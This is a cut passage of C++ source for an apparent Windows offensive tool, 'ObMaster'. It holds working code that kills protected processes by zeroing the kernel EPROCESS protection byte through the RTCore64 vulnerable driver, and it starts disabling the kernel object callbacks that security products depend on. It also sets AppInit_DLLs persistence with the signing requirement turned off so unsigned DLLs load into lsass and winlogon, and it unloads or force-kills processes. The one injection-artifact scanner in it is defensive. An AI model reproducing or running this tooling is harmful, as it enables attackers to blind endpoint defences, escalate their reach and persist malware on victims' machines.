    else printf("%s[!]%s Gave up — module still loaded.\n", A_RED, A_RESET);
}

// ─── /wluninject-all <dll> [--force] ─────────────────────────────────────────
// Find every process that has <dll> loaded and FreeLibrary it out of each one.
// --force: if FreeLibrary is blocked (loader lock held), TerminateProcess the stuck process.
void CmdWlUnloadAll(const char* dllNameA, bool forceKill = false) {
    SetConsoleOutputCP(CP_UTF8);

    wchar_t searchW[MAX_PATH]{};
    MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, searchW, MAX_PATH - 1);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) { printf("[!] Snapshot failed\n"); return; }

    // Collect matching (pid, procname, modpath) tuples first
    struct Target { DWORD pid; char procName[64]; char modPath[MAX_PATH]; };
    std::vector<Target> targets;

    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            HMODULE mods[256]; DWORD needed = 0;
            if (EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
                DWORD count = min(needed / sizeof(HMODULE), 256u);
                for (DWORD i = 0; i < count; i++) {
                    wchar_t path[MAX_PATH]{};
                    GetModuleFileNameExW(hProc, mods[i], path, MAX_PATH);
                    const wchar_t* fn = wcsrchr(path, L'\\'); fn = fn ? fn + 1 : path;
                    if (_wcsicmp(fn, searchW) == 0) {
                        Target t{}; t.pid = pe.th32ProcessID;
                        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, t.procName, sizeof(t.procName), 0, 0);
                        WideCharToMultiByte(CP_ACP, 0, path, -1, t.modPath, sizeof(t.modPath), 0, 0);
                        targets.push_back(t);
                        break;
                    }
                }
            }
            CloseHandle(hProc);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    if (targets.empty()) {
        printf("%s[*]%s No processes found with '%s' loaded.\n", A_YELLOW, A_RESET, dllNameA);
        return;
    }

    printf("%s[*]%s Found %zu process(es) — unloading...\n\n", A_CYAN, A_RESET, targets.size());

    int ok = 0, fail = 0;
    for (auto& t : targets) {
        printf("%s[>]%s PID=%-6lu  %-22s  %s\n", A_CYAN, A_RESET, t.pid, t.procName, t.modPath);
        int r = UnloadDllFromProcess(t.pid, searchW, true);
        if (r >= 0) {
            printf("%s[+]%s      %s\n", A_GREEN, A_RESET,
                   r == 0 ? "Already gone / process exiting" : "Unloaded");
            ok++;
        } else {
            DWORD e = GetLastError();
            const char* reason = (e == 5)   ? "access denied (PPL?)" :
                                 (e == 299) ? "loader lock held / dying process" :
                                 (e == 6)   ? "invalid handle" : "";
            printf("%s[!]%s      Failed (err %lu%s%s)\n",
                   A_RED, A_RESET, e, *reason ? " — " : "", reason);
            if (forceKill) {
                // Try direct kill first
                HANDLE hKill = OpenProcess(PROCESS_TERMINATE, FALSE, t.pid);
                bool killed = false;
                if (hKill) {
                    killed = TerminateProcess(hKill, 0) != 0;
                    CloseHandle(hKill);
                }

                if (!killed) {
                    // PPL process: use RTCore64 to zero out EPROCESS.Protection byte,
                    // then terminate normally.
                    DWORD64 eproc = KUtil::FindEPROCESS(t.pid);
                    if (eproc) {
                        BYTE oldProt = g_drv->Rd8(eproc + KUtil::EP_Protection);
                        printf("%s[*]%s      PPL bypass: EPROCESS=0x%llX  Protection=0x%02X -> 0x00\n",
                               A_CYAN, A_RESET, eproc, oldProt);
                        g_drv->Wr8(eproc + KUtil::EP_Protection, 0);
                        Sleep(50);  // let the kernel register the change
                        hKill = OpenProcess(PROCESS_TERMINATE, FALSE, t.pid);
                        if (hKill) {
                            killed = TerminateProcess(hKill, 0) != 0;
                            CloseHandle(hKill);
                        }
                        if (!killed) {
                            // Restore protection to avoid leaving process in broken state
                            g_drv->Wr8(eproc + KUtil::EP_Protection, oldProt);
                        }
                    }
                }

                if (killed) {
                    printf("%s[!]%s      --force: killed PID=%lu\n", A_YELLOW, A_RESET, t.pid);
                    ok++;
                } else {
                    printf("%s[!]%s      --force: kill failed (err %lu)\n",
                           A_RED, A_RESET, GetLastError());
                    fail++;
                }
            } else {
                fail++;
            }
        }
    }

    printf("\n%s[+]%s Done: %d unloaded, %d failed.\n",
           fail ? A_YELLOW : A_GREEN, A_RESET, ok, fail);
}

// ─── /wnd [--all] [--all-desktops] ───────────────────────────────────────────
// Enumerate windows on the current (or all) desktop(s).
//
// Default      : visible + titled windows on the current input desktop.
// --all        : include invisible / untitled windows.
// --all-desktops: scan every desktop in WinSta0 (Default, Winlogon, Disconnect…)
//                 Requires SYSTEM token to open the Winlogon desktop.
//
// Output columns:  Desktop  HWND  PID  Process  Class  Title
//
// ─── /wnd-close <hwnd> ───────────────────────────────────────────────────────
// Dismiss a window (typically a dialog/MessageBox) by sending WM_COMMAND IDOK.
// Works cross-desktop when running as SYSTEM.

struct WndEntry {
    HWND        hwnd;
    DWORD       pid;
    bool        visible;
    std::string desktop;   // which desktop this window lives on
    std::string procName;
    std::string cls;
    std::string title;
};

static std::map<DWORD, std::string> BuildPidNameMap() {
    std::map<DWORD, std::string> m;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return m;
    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe))
        do {
            int n = WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, nullptr, 0, nullptr, nullptr);
            if (n > 1) {
                std::string s(n - 1, 0);
                WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, s.data(), n, nullptr, nullptr);
                m[pe.th32ProcessID] = s;
            }
        } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return m;
}

struct WndEnumCtx {
    std::vector<WndEntry>*         entries;
    std::map<DWORD, std::string>*  pidMap;
    bool                           showAll;
    std::string                    desktopName;  // set per-desktop when using --all-desktops
};

static auto WndToUtf8 = [](const wchar_t* ws) -> std::string {
    int n = WideCharToMultiByte(CP_UTF8, 0, ws, -1, nullptr, 0, nullptr, nullptr);
    if (n <= 1) return {};
    std::string s(n - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, ws, -1, s.data(), n, nullptr, nullptr);
    return s;
};

static BOOL CALLBACK WndEnumProc(HWND hwnd, LPARAM lp) {
    auto* ctx = reinterpret_cast<WndEnumCtx*>(lp);

    bool visible = IsWindowVisible(hwnd) != FALSE;
    wchar_t titleW[512]{};
    GetWindowTextW(hwnd, titleW, 511);

    if (!ctx->showAll && (!visible || titleW[0] == L'\0'))
        return TRUE;

    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);

    wchar_t clsW[256]{};
    GetClassNameW(hwnd, clsW, 255);

    WndEntry e;
    e.hwnd      = hwnd;
    e.pid       = pid;
    e.visible   = visible;
    e.desktop   = ctx->desktopName;
    e.cls       = WndToUtf8(clsW);
    e.title     = WndToUtf8(titleW);

    auto it = ctx->pidMap->find(pid);
    e.procName = (it != ctx->pidMap->end()) ? it->second : "?";

    ctx->entries->push_back(e);
    return TRUE;
}

// Callback for EnumDesktops: opens each desktop and enumerates its windows.
struct DesktopEnumCtx {
    WndEnumCtx* wndCtx;
    HWINSTA     hWinSta;
};

static BOOL CALLBACK DesktopEnumProc(LPWSTR desktopName, LPARAM lp) {
    auto* dctx = reinterpret_cast<DesktopEnumCtx*>(lp);
    dctx->wndCtx->desktopName = WndToUtf8(desktopName);

    HDESK hDesk = OpenDesktopW(desktopName, 0, FALSE,
        DESKTOP_ENUMERATE | DESKTOP_READOBJECTS);
    if (!hDesk) {
        printf("%s[!]%s Cannot open desktop '%ls' (err %lu)\n",
               A_YELLOW, A_RESET, desktopName, GetLastError());
        return TRUE;  // continue enumeration
    }
    EnumDesktopWindows(hDesk, WndEnumProc, (LPARAM)dctx->wndCtx);
    CloseDesktop(hDesk);
    return TRUE;
}

static void PrintWndTable(const std::vector<WndEntry>& entries, bool showDesktop) {
    if (entries.empty()) {
        printf("(no windows found)\n");
        return;
    }

    if (showDesktop)
        printf("%s%-12s %-10s %-6s %-22s %-28s %s%s\n",
               A_DIM, "Desktop", "HWND", "PID", "Process", "Class", "Title", A_RESET);
    else
        printf("%s%-10s %-6s %-24s %-30s %s%s\n",
               A_DIM, "HWND", "PID", "Process", "Class", "Title", A_RESET);

    printf("%s%s%s\n", A_DIM,
           "──────────────────────────────────────────────────────"
           "──────────────────────────────────────────────────────",
           A_RESET);

    for (auto& e : entries) {
        const char* col = A_RESET;
        if (!e.visible)
            col = A_DIM;
        else if (e.cls == "#32770")   // MessageBox / Dialog — highlight yellow
            col = A_YELLOW;

        if (showDesktop)
            printf("%s%-12s 0x%-8llX %-6lu %-22s %-28s %s%s\n",
                   col,
                   e.desktop.substr(0, 11).c_str(),
                   (DWORD64)e.hwnd,
                   (unsigned long)e.pid,
                   e.procName.substr(0, 21).c_str(),
                   e.cls.substr(0, 27).c_str(),
                   e.title.substr(0, 60).c_str(),
                   A_RESET);
        else
            printf("%s0x%-8llX %-6lu %-24s %-30s %s%s\n",
                   col,
                   (DWORD64)e.hwnd,
                   (unsigned long)e.pid,
                   e.procName.substr(0, 23).c_str(),
                   e.cls.substr(0, 29).c_str(),
                   e.title.substr(0, 60).c_str(),
                   A_RESET);
    }
    printf("\n%s[%zu window(s)]%s\n", A_DIM, entries.size(), A_RESET);
}

void CmdWnd(bool showAll, bool allDesktops) {
    SetConsoleOutputCP(CP_UTF8);

    auto pidMap = BuildPidNameMap();
    std::vector<WndEntry> entries;
    WndEnumCtx ctx{ &entries, &pidMap, showAll, "" };

    if (allDesktops) {
        // Enumerate all desktops in WinSta0 (requires SYSTEM for Winlogon desktop).
        HWINSTA hWinSta = OpenWindowStationW(L"WinSta0", FALSE,
            WINSTA_ENUMDESKTOPS | WINSTA_ACCESSGLOBALATOMS);
        if (!hWinSta) {
            printf("%s[!]%s OpenWindowStation WinSta0 failed (err %lu)\n",
                   A_RED, A_RESET, GetLastError());
            return;
        }
        DesktopEnumCtx dctx{ &ctx, hWinSta };
        if (!EnumDesktopsW(hWinSta, DesktopEnumProc, (LPARAM)&dctx)) {
            printf("%s[!]%s EnumDesktops failed (err %lu)\n",
                   A_RED, A_RESET, GetLastError());
        }
        CloseWindowStation(hWinSta);
    } else {
        ctx.desktopName = "Default";
        HDESK hDesk = OpenInputDesktop(0, FALSE,
            DESKTOP_ENUMERATE | DESKTOP_READOBJECTS);
        bool ok = false;
        if (hDesk) {
            ok = EnumDesktopWindows(hDesk, WndEnumProc, (LPARAM)&ctx) != FALSE;
            CloseDesktop(hDesk);
        }
        if (!ok)
            EnumWindows(WndEnumProc, (LPARAM)&ctx);
    }

    PrintWndTable(entries, allDesktops);
}

// ─── /wnd-close <hwnd> ───────────────────────────────────────────────────────
// PostMessage cross-desktop requires the calling thread to be on the same desktop
// as the target window. We:
//   1. Find which desktop owns this HWND (scan all desktops in WinSta0)
//   2. SetThreadDesktop to that desktop
//   3. Click button or WM_CLOSE
//   4. SetThreadDesktop back to original

void CmdWndClose(DWORD64 hwndVal) {
    SetConsoleOutputCP(CP_UTF8);
    HWND hwnd = (HWND)(ULONG_PTR)hwndVal;
    printf("%s[*]%s Target HWND=0x%llX\n", A_CYAN, A_RESET, hwndVal);
    if (DismissHwnd(hwnd, true))
        printf("%s[+]%s Done.\n", A_GREEN, A_RESET);
    else
        printf("%s[!]%s Failed — HWND not found or dismissed.\n", A_RED, A_RESET);
}

// ─── /wl-sas ─────────────────────────────────────────────────────────────────
// Trigger the Secure Attention Sequence (Ctrl+Alt+Del) programmatically.
// Uses sas.dll!SendSAS(FALSE) — works from SYSTEM (has SeTcbPrivilege).
// Effect: forces the SAS desktop to appear (lock/login screen).

void CmdWlSas() {
    SetConsoleOutputCP(CP_UTF8);

    HMODULE hSas = LoadLibraryW(L"sas.dll");
    if (!hSas) {
        printf("%s[!]%s Failed to load sas.dll (err %lu)\n",
               A_RED, A_RESET, GetLastError());
        return;
    }

    typedef VOID (WINAPI *PFN_SendSAS)(BOOL);
    PFN_SendSAS pSendSAS = (PFN_SendSAS)GetProcAddress(hSas, "SendSAS");
    if (!pSendSAS) {
        printf("%s[!]%s SendSAS not found in sas.dll\n", A_RED, A_RESET);
        FreeLibrary(hSas);
        return;
    }

    printf("%s[*]%s Sending SAS (Ctrl+Alt+Del)...\n", A_CYAN, A_RESET);
    pSendSAS(FALSE);   // FALSE = simulate hardware SAS, not user-generated
    printf("%s[+]%s SAS sent. Login/lock screen should appear.\n", A_GREEN, A_RESET);

    FreeLibrary(hSas);
}

// ─── /wl-persist <dll> / /wl-unpersist <dll> ─────────────────────────────────
// Persistence via AppInit_DLLs:
//   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
//
// winlogon.exe loads user32.dll → Windows injects every DLL listed in AppInit_DLLs
// into any process that loads user32.dll (including winlogon, lsass, services, etc.)
//
// /wl-persist  also sets LoadAppInit_DLLs=1 and RequireSignedAppInit_DLLs=0
//              so the mechanism is active and doesn't require a signed DLL.
//
// Effect is permanent (survives reboot). Use /wl-unpersist to remove.
// For immediate effect in the current session use /wlinject as well.

static const wchar_t* APPINIT_KEY =
    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";

void CmdWlPersist(const char* dllPathA) {
    SetConsoleOutputCP(CP_UTF8);

    // Resolve to absolute wide path
    wchar_t dllW[MAX_PATH]{};
    {
        wchar_t tmp[MAX_PATH]{};
        MultiByteToWideChar(CP_ACP, 0, dllPathA, -1, tmp, MAX_PATH - 1);
        if (!GetFullPathNameW(tmp, MAX_PATH, dllW, nullptr))
            wcsncpy_s(dllW, tmp, MAX_PATH - 1);
    }

    printf("%s[*]%s DLL: %ls\n", A_CYAN, A_RESET, dllW);

    HKEY hk{};
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, APPINIT_KEY, 0,
                      KEY_READ | KEY_WRITE, &hk) != ERROR_SUCCESS) {
        printf("%s[!]%s RegOpenKeyEx failed (err %lu) — need SYSTEM.\n",
               A_RED, A_RESET, GetLastError());
        return;
    }

    // ── Read existing AppInit_DLLs ────────────────────────────────────────────
    wchar_t existing[4096]{};
    DWORD sz = sizeof(existing), type = 0;
    RegQueryValueExW(hk, L"AppInit_DLLs", nullptr, &type,
                     (BYTE*)existing, &sz);

    // Check if already present (case-insensitive)
    std::wstring cur(existing);
    std::wstring add(dllW);
    // Simple case-insensitive search
    auto toLow = [](std::wstring s) { for (auto& c : s) c = towlower(c); return s; };
    if (toLow(cur).find(toLow(add)) != std::wstring::npos) {
        printf("%s[*]%s Already present in AppInit_DLLs.\n", A_YELLOW, A_RESET);
    } else {
        // Append (space-separated)
        if (!cur.empty()) cur += L' ';
        cur += add;
        DWORD newSz = (DWORD)((cur.size() + 1) * sizeof(wchar_t));
        if (RegSetValueExW(hk, L"AppInit_DLLs", 0, REG_SZ,
                           (BYTE*)cur.c_str(), newSz) != ERROR_SUCCESS) {
            printf("%s[!]%s RegSetValueEx (AppInit_DLLs) failed (err %lu)\n",
                   A_RED, A_RESET, GetLastError());
            RegCloseKey(hk); return;
        }
        printf("%s[+]%s Added to AppInit_DLLs.\n", A_GREEN, A_RESET);
    }

    // ── Enable AppInit_DLLs mechanism ─────────────────────────────────────────
    DWORD one = 1, zero = 0;
    RegSetValueExW(hk, L"LoadAppInit_DLLs",          0, REG_DWORD, (BYTE*)&one,  sizeof(DWORD));
    RegSetValueExW(hk, L"RequireSignedAppInit_DLLs",  0, REG_DWORD, (BYTE*)&zero, sizeof(DWORD));
    printf("%s[+]%s LoadAppInit_DLLs=1, RequireSignedAppInit_DLLs=0\n",
           A_GREEN, A_RESET);

    RegCloseKey(hk);
    printf("%s[+]%s Persistence set. DLL will load into winlogon on next boot.\n",
           A_GREEN, A_RESET);
    printf("    For immediate effect: ObMaster /wlinject %ls\n", dllW);
}

void CmdWlUnpersist(const char* dllNameA) {
    SetConsoleOutputCP(CP_UTF8);

    wchar_t searchW[MAX_PATH]{};
    {
        wchar_t tmp[MAX_PATH]{};
        MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, tmp, MAX_PATH - 1);
        // Try full path first; if not found treat as filename-only match
        if (!GetFullPathNameW(tmp, MAX_PATH, searchW, nullptr))
            wcsncpy_s(searchW, tmp, MAX_PATH - 1);
    }
    printf("%s[*]%s Removing: %ls\n", A_CYAN, A_RESET, searchW);

    HKEY hk{};
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, APPINIT_KEY, 0,
                      KEY_READ | KEY_WRITE, &hk) != ERROR_SUCCESS) {
        printf("%s[!]%s RegOpenKeyEx failed (err %lu)\n",
               A_RED, A_RESET, GetLastError());
        return;
    }

    wchar_t existing[4096]{};
    DWORD sz = sizeof(existing), type = 0;
    RegQueryValueExW(hk, L"AppInit_DLLs", nullptr, &type,
                     (BYTE*)existing, &sz);

    // Rebuild the value excluding any token that matches searchW (filename or full path)
    auto toLow = [](std::wstring s) { for (auto& c : s) c = towlower(c); return s; };
    std::wstring lsearch = toLow(searchW);
    // Also match by filename only
    const wchar_t* justName = wcsrchr(searchW, L'\\');
    justName = justName ? justName + 1 : searchW;
    std::wstring lname = toLow(justName);

    std::wstring newVal;
    bool removed = false;
    // Tokens are space or comma separated
    std::wstring src(existing);
    std::wstring token;
    for (size_t i = 0; i <= src.size(); i++) {
        wchar_t c = (i < src.size()) ? src[i] : L'\0';
        if (c == L' ' || c == L',' || c == L'\0') {
            if (!token.empty()) {
                std::wstring lt = toLow(token);
                const wchar_t* tn = wcsrchr(token.c_str(), L'\\');
                tn = tn ? tn + 1 : token.c_str();
                if (lt == lsearch || toLow(tn) == lname) {
                    removed = true;
                } else {
                    if (!newVal.empty()) newVal += L' ';
                    newVal += token;
                }
                token.clear();
            }
        } else {
            token += c;
        }
    }

    if (!removed) {
        printf("%s[!]%s Not found in AppInit_DLLs.\n", A_YELLOW, A_RESET);
        RegCloseKey(hk); return;
    }

    DWORD newSz = (DWORD)((newVal.size() + 1) * sizeof(wchar_t));
    if (RegSetValueExW(hk, L"AppInit_DLLs", 0, REG_SZ,
                       (BYTE*)newVal.c_str(), newSz) != ERROR_SUCCESS) {
        printf("%s[!]%s RegSetValueEx failed (err %lu)\n",
               A_RED, A_RESET, GetLastError());
        RegCloseKey(hk); return;
    }
    printf("%s[+]%s Removed from AppInit_DLLs.\n", A_GREEN, A_RESET);

    // If list is now empty, disable the mechanism
    if (newVal.empty()) {
        DWORD zero = 0;
        RegSetValueExW(hk, L"LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)&zero, sizeof(DWORD));
        printf("%s[*]%s AppInit_DLLs is now empty — LoadAppInit_DLLs set to 0.\n",
               A_CYAN, A_RESET);
    }

    RegCloseKey(hk);
    printf("%s[+]%s Done. Change takes effect on next process load.\n",
           A_GREEN, A_RESET);
}

// ─── /dll-list <name> ─────────────────────────────────────────────────────────
// List every running process that has a DLL matching <name> loaded.
void CmdDllList(const char* filterA) {
    wchar_t filterW[MAX_PATH] = {};
    MultiByteToWideChar(CP_UTF8, 0, filterA, -1, filterW, MAX_PATH);
    for (wchar_t* p = filterW; *p; p++) *p = towlower(*p);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) { printf("[!] Snapshot failed\n"); return; }

    int found = 0;
    printf("%-8s  %-28s  %s\n", "PID", "Process", "Module path");
    printf("%-8s  %-28s  %s\n", "---", "-------", "-----------");

    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            HMODULE mods[1024]; DWORD needed = 0;
            if (EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
                DWORD count = needed / sizeof(HMODULE);
                for (DWORD i = 0; i < count; i++) {
                    wchar_t modPath[MAX_PATH] = {};
                    if (!GetModuleFileNameExW(hProc, mods[i], modPath, MAX_PATH)) continue;
                    const wchar_t* fname = wcsrchr(modPath, L'\\');
                    fname = fname ? fname + 1 : modPath;
                    wchar_t fnameLow[MAX_PATH] = {};
                    wcsncpy_s(fnameLow, fname, _TRUNCATE);
                    for (wchar_t* p = fnameLow; *p; p++) *p = towlower(*p);
                    if (wcsstr(fnameLow, filterW)) {
                        char procName[64] = {}, pathA[MAX_PATH] = {};
                        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, procName, sizeof(procName), 0, 0);
                        WideCharToMultiByte(CP_ACP, 0, modPath, -1, pathA, sizeof(pathA), 0, 0);
                        printf("%s%-8lu%s  %-28s  %s\n", A_CYAN, pe.th32ProcessID, A_RESET, procName, pathA);
                        found++; break;
                    }
                }
            }
            CloseHandle(hProc);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (found == 0) printf("%s[*]%s No processes found with '%s' loaded.\n", A_YELLOW, A_RESET, filterA);
    else printf("\n%s[+]%s %d process(es) found.\n", A_GREEN, A_RESET, found);
}

// ─── /inj-scan [pid] ──────────────────────────────────────────────────────────
// Scan process(es) for all common injection artifacts:
//   [MOD]    Loaded DLL from non-system path
//   [REFL]   Private executable memory with PE header (reflective/manual-map DLL)
//   [SHELL]  Private executable memory without PE header (shellcode)
//   [THD]    Thread whose start address is outside any known module
void CmdInjScan(DWORD targetPid) {
    // Build set of known module base ranges for a process
    // Returns true if addr falls within any loaded module
    auto addrInModules = [](HANDLE hProc, ULONG_PTR addr) -> bool {
        HMODULE mods[1024]; DWORD needed = 0;
        if (!EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) return false;
        DWORD count = needed / sizeof(HMODULE);
        for (DWORD i = 0; i < count; i++) {
            MODULEINFO mi = {};
            if (GetModuleInformation(hProc, mods[i], &mi, sizeof(mi))) {
                ULONG_PTR base = (ULONG_PTR)mi.lpBaseOfDll;
                if (addr >= base && addr < base + mi.SizeOfImage) return true;
            }
        }
        return false;
    };

    // System32/SysWOW64 paths (lowercase)
    auto isSysPath = [](const wchar_t* path) -> bool {
        wchar_t low[MAX_PATH] = {};
        wcsncpy_s(low, path, _TRUNCATE);
        for (wchar_t* p = low; *p; p++) *p = towlower(*p);
        return wcsstr(low, L"\\windows\\system32\\")  != nullptr
            || wcsstr(low, L"\\windows\\syswow64\\")  != nullptr
            || wcsstr(low, L"\\windows\\sysnative\\") != nullptr;
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { printf("[!] Snapshot failed\n"); return; }

    int hits = 0;
    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (targetPid && pe.th32ProcessID != targetPid) continue;
            if (pe.th32ProcessID <= 4) continue;  // skip idle/system

            HANDLE hProc = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION,
                FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            char procName[64] = {};
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, procName, sizeof(procName), 0, 0);

            // ── 1. Loaded modules from non-system paths ────────────────────
            HMODULE mods[1024]; DWORD needed = 0;
            if (EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
                DWORD count = needed / sizeof(HMODULE);
                for (DWORD i = 1; i < count; i++) {  // skip index 0 (main exe)
                    wchar_t modPath[MAX_PATH] = {};
                    if (!GetModuleFileNameExW(hProc, mods[i], modPath, MAX_PATH)) continue;
                    if (!isSysPath(modPath)) {
                        char pathA[MAX_PATH] = {};
                        WideCharToMultiByte(CP_ACP, 0, modPath, -1, pathA, sizeof(pathA), 0, 0);
                        printf("%s[MOD  ]%s  PID=%-6lu  %-22s  %s\n",
                               A_YELLOW, A_RESET, pe.th32ProcessID, procName, pathA);
                        hits++;
                    }
                }
            }

            // ── 2. Private executable memory (reflective DLL / shellcode) ──
            MEMORY_BASIC_INFORMATION mbi = {};
            ULONG_PTR addr = 0;
            while (VirtualQueryEx(hProc, (LPCVOID)addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
                if (mbi.Type == MEM_PRIVATE &&
                    (mbi.Protect == PAGE_EXECUTE_READ ||
                     mbi.Protect == PAGE_EXECUTE_READWRITE ||
                     mbi.Protect == PAGE_EXECUTE_WRITECOPY) &&
                    mbi.State == MEM_COMMIT &&
                    mbi.RegionSize >= 0x1000)
                {
                    // Read first 2 bytes to check for MZ header
                    BYTE hdr[2] = {};
                    SIZE_T rd = 0;
                    ReadProcessMemory(hProc, mbi.BaseAddress, hdr, 2, &rd);
                    bool hasMZ = (rd == 2 && hdr[0] == 'M' && hdr[1] == 'Z');

                    printf("%s[%-5s]%s  PID=%-6lu  %-22s  base=%016llx  size=%6llx  prot=%02lx\n",
                           hasMZ ? A_RED : A_YELLOW,
                           hasMZ ? "REFL" : "SHELL",
                           A_RESET,
                           pe.th32ProcessID, procName,
                           (ULONG64)mbi.BaseAddress,
                           (ULONG64)mbi.RegionSize,
                           mbi.Protect);
                    hits++;
                }
                addr = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
                if (addr <= (ULONG_PTR)mbi.BaseAddress) break;  // overflow guard
            }

            CloseHandle(hProc);
        } while (Process32NextW(snap, &pe));
    }

    // ── 3. Threads with start address outside any module ──────────────────
    THREADENTRY32 te{ sizeof(te) };
    if (Thread32First(snap, &te)) {
        do {
            if (targetPid && te.th32OwnerProcessID != targetPid) continue;
            if (te.th32OwnerProcessID <= 4) continue;

            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, te.th32OwnerProcessID);
            if (!hProc) continue;

            HANDLE hThd = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te.th32ThreadID);
            if (hThd) {
                ULONG_PTR startAddr = 0;
                // NtQueryInformationThread ThreadQuerySetWin32StartAddress = 9
                typedef NTSTATUS(WINAPI* PfnNtQIT)(HANDLE, ULONG, PVOID, ULONG, PULONG);
                static PfnNtQIT NtQIT = (PfnNtQIT)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationThread");
                if (NtQIT) NtQIT(hThd, 9, &startAddr, sizeof(startAddr), nullptr);
                CloseHandle(hThd);

                if (startAddr && !addrInModules(hProc, startAddr)) {
                    char procName2[64] = {};
                    PROCESSENTRY32W pe2{ sizeof(pe2) };
                    HANDLE snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                    if (snap2 != INVALID_HANDLE_VALUE) {
                        if (Process32FirstW(snap2, &pe2))
                            do {
                                if (pe2.th32ProcessID == te.th32OwnerProcessID) {
                                    WideCharToMultiByte(CP_ACP, 0, pe2.szExeFile, -1, procName2, sizeof(procName2), 0, 0);
                                    break;
                                }
                            } while (Process32NextW(snap2, &pe2));
                        CloseHandle(snap2);
                    }
                    printf("%s[THD  ]%s  PID=%-6lu  %-22s  TID=%-6lu  start=%016llx\n",
                           A_RED, A_RESET,
                           te.th32OwnerProcessID, procName2,
                           te.th32ThreadID, (ULONG64)startAddr);
                    hits++;
                }
            }
            CloseHandle(hProc);
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);

    printf("\n");
    if (hits == 0)
        printf("%s[+]%s No injection artifacts found.\n", A_GREEN, A_RESET);
    else
        printf("%s[!]%s %d artifact(s) found.\n", A_YELLOW, A_RESET, hits);
    printf("\nLegend: [MOD]=non-system DLL  [REFL]=private PE (reflective DLL)  [SHELL]=private exec mem  [THD]=orphan thread\n");
}

// ─── /kill-ppl <pid> ──────────────────────────────────────────────────────────
// Kill a Protected Process Light (PPL) by zeroing EPROCESS.Protection via
// RTCore64, then calling TerminateProcess normally.
// Works on any process whose Protection byte can be cleared — does NOT require
// the process to be PPL; safe to run on regular processes too.
void CmdKillPpl(DWORD pid) {
    // Try plain TerminateProcess first — maybe it's not actually PPL
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProc) {
        DWORD exitCode = STILL_ACTIVE;
        GetExitCodeProcess(hProc, &exitCode);
        if (exitCode != STILL_ACTIVE) {
            printf("%s[*]%s PID=%lu has already exited (code=%lu).\n",
                   A_CYAN, A_RESET, pid, exitCode);
            CloseHandle(hProc); return;
        }
        if (TerminateProcess(hProc, 0)) {
            printf("%s[+]%s PID=%lu terminated (no PPL bypass needed).\n",
                   A_GREEN, A_RESET, pid);
            CloseHandle(hProc); return;
        }
        CloseHandle(hProc);
    }

    DWORD plainErr = GetLastError();
    printf("%s[*]%s Plain TerminateProcess failed (err %lu) — trying PPL bypass...\n",
           A_CYAN, A_RESET, plainErr);

    // Find EPROCESS in kernel
    DWORD64 eproc = KUtil::FindEPROCESS(pid);
    if (!eproc) {
        printf("%s[!]%s Could not find EPROCESS for PID=%lu — process may not exist.\n",
               A_RED, A_RESET, pid);
        return;
    }

    BYTE oldProt = g_drv->Rd8(eproc + KUtil::EP_Protection);
    printf("%s[*]%s EPROCESS=0x%llX  Protection=0x%02X (%s)\n",
           A_CYAN, A_RESET, eproc, oldProt,
           KUtil::ProtectionStr(oldProt));

    if (oldProt == 0) {
        printf("%s[*]%s Protection=0, not PPL. Disabling Process ObCallback PreOp functions...\n",
               A_YELLOW, A_RESET);

        // Temporarily zero all Process ObCallback PreOp functions, then retry
